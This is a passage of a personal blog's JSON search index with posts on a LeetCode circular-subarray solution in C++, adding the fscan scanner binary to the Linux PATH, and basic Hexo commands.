参考链接[原创]Z3求解约束器及例题z3约束器Z3一把梭：用约束求解搞定一类CTF题","categories":[{"name":"Re","slug":"Re","permalink":"https://corsnail.github.io/categories/Re/"}],"tags":[{"name":"z3","slug":"z3","permalink":"https://corsnail.github.io/tags/z3/"}]},{"title":"leetcode每日一题7.20kandane","slug":"leetcode每日一题7-20kandane","date":"2023-07-20T03:20:06.000Z","updated":"2023-07-20T05:24:44.912Z","comments":true,"path":"2023/07/20/leetcode每日一题7-20kandane/","link":"","permalink":"https://corsnail.github.io/2023/07/20/leetcode%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%987-20kandane/","excerpt":"","text":"题目链接：https://leetcode.cn/problems/maximum-sum-circular-subarray/leetcode今天的题目是一个环形数组求最大和很明显是一个动态规划，使用kandane算法很简单解决 kandane算法讲解：https://medium.com/@rsinghal757/kadanes-algorithm-dynamic-programming-how-and-why-does-it-work-3fd8849ed73d这个大佬讲的比较好设数组为a时，当前索引i的最大子数组和等于前索引i-1的最大子数组和加上当前值a[i]代码实现 12345678910111213141516class Solution &#123;public: int maxSubarraySumCircular(vector&lt;int&gt;&amp; nums) &#123; int len = nums.size(); int local_max = 0; int global_max = INT_MIN; for (int i = 0; i &lt; 2*len; i++) &#123; local_max = max(nums[i%len],nums[i%len] + local_max); if (local_max &gt; global_max) global_max = local_max; &#125; return global_max; &#125;&#125;; 但是这个问题比起其他题目有所不同，是一个环形数组 最大子数组有两种情况case1最大子数组和在中间，这时上面的代码就可以直接使用得到最大子数组和 case2最大子数组贯穿头尾这时就只能计算最小子数组和，然后用总和减去最小的子数组和即可 最终代码： 1234567891011121314151617181920212223242526272829class Solution &#123;public: int maxSubarraySumCircular(vector&lt;int&gt;&amp; nums) &#123; int len = nums.size(); int local_max = 0; int global_max = INT_MIN; int total_sum = 0; for (int i = 0; i &lt; len; i++) &#123; local_max = max(nums[i], nums[i] + local_max); global_max = max(local_max, global_max); total_sum += nums[i]; &#125; //对于环形的数组，总和一定，总和减去最小的子数组和就是最大子数组和 int min_wrap = INT_MAX; int current_sum = 0; for (int i = 0; i &lt; len; ++i) &#123; current_sum = min(nums[i], nums[i] + current_sum); min_wrap = min(min_wrap, current_sum); &#125; int max_wrap = total_sum - min_wrap; // 重新计算 max_wrap if (max_wrap == 0) &#123; return global_max; &#125; return max(global_max, max_wrap); &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://corsnail.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://corsnail.github.io/tags/leetcode/"}]},{"title":"linux可执行文件添加到环境变量","slug":"linux可执行文件添加到环境变量","date":"2023-07-04T13:59:28.000Z","updated":"2023-07-08T06:21:52.146Z","comments":true,"path":"2023/07/04/linux可执行文件添加到环境变量/","link":"","permalink":"https://corsnail.github.io/2023/07/04/linux%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/","excerpt":"","text":"遇见问题在使用fscan的过程中，需要把源码下载下来编译，编译之后是一个可执行文件而使用时就需要 1./main -h 192.168.1.133/24 于是我就想将可执行文件添加到环境变量中 解决 打开配置文件，看终端，可能是bashrc，我的是zshrc 在末尾加入一行，&#x2F;path&#x2F;to&#x2F;fscan是你的fscan目录路径，刚编译好的fscan需要改个名1export PATH=/path/to/fscan:$PATH 然后记得更新1source ~/.zshrc 然后就可以在终端的任何地方使用fscan了 其实不止这一种方法，添加进不同的位置有不同的作用，可以参考：https://blog.csdn.net/weixin_38870322/article/details/80169531 另外还有个思路，linux会有一个文件夹（&#x2F;bin）专门放可执行文件，linux环境变量会加入这个文件夹的全部变量，输入下面命令可以看到 1echo $PATH 有很多个目录，建议不要打乱它本身的秩序，具体不同分类的区别可以看下面https://blog.csdn.net/lh2016rocky/article/details/70801030总结就是： 重要的二进制位于 &#x2F;bin（用户二进制）以及 &#x2F;sbin（系统二进制）中。不重要的二进制（如图形环境或Office 工具）安装在 &#x2F;usr&#x2F;bin 和 &#x2F;usr&#x2F;sbin中。进行这种分隔是为了尽可能地缩小根分区。使用源代码编译的软件通常位于 &#x2F;usr&#x2F;local&#x2F;bin 和 &#x2F;usr&#x2F;local&#x2F;sbin中。 所以这里我们的fscan应该放到&#x2F;usr&#x2F;local&#x2F;bin中，直接 1sudo cp /home/kali/fscan/fscan /usr/local/bin 记得sudo这样去掉环境变量中的fscan目录，也可以使用","categories":[{"name":"技术分享","slug":"技术分享","permalink":"https://corsnail.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://corsnail.github.io/tags/linux/"}]},{"title":"hexo使用","slug":"hexo使用","date":"2023-07-04T03:07:11.000Z","updated":"2023-07-04T05:34:05.676Z","comments":true,"path":"2023/07/04/hexo使用/","link":"","permalink":"https://corsnail.github.io/2023/07/04/hexo%E4%BD%BF%E7%94%A8/","excerpt":"","text":"hexo g # 生成博客网页文件hexo s # 本地预览博客hexo d # 上传网页文件到github hexo new post “article title” #新建文章","categories":[{"name":"hexo","slug":"hexo","permalink":"https://corsnail.github.io/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://corsnail.github.io/tags/hexo/"}]},{"title":"你好","slug":"你好","date":"2023-06-06T12:21:35.000Z","updated":"2023-06-06T12:22:06.053Z","comments":true,"path":"2023/06/06/你好/","link":"","permalink":"https://corsnail.github.io/2023/06/06/%E4%BD%A0%E5%A5%BD/","excerpt":"","text":"hello!","categories":[],"tags":[]}],"categories":[{"name":"web","slug":"web","permalink":"https://corsnail.github.io/categories/web/"},{"name":"wp","slug":"wp","permalink":"https://corsnail.github.io/categories/wp/"},{"name":"Re","slug":"Re","permalink":"https://corsnail.github.io/categories/Re/"},{"name":"算法","slug":"算法","permalink":"https://corsnail.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"技术分享","slug":"技术分享","permalink":"https://corsnail.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"},{"name":"hexo","slug":"hexo","permalink":"https://corsnail.github.io/categories/hexo/"}],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://corsnail.github.io/tags/pikachu/"},{"name":"CTF","slug":"CTF","permalink":"https://corsnail.github.io/tags/CTF/"},{"name":"z3","slug":"z3","permalink":"https://corsnail.github.io/tags/z3/"},{"name":"leetcode","slug":"leetcode","permalink":"https://corsnail.github.io/tags/leetcode/"},{"name":"linux","slug":"linux","permalink":"https://corsnail.github.io/tags/linux/"},{"name":"hexo","slug":"hexo","permalink":"https://corsnail.github.io/tags/hexo/"}]}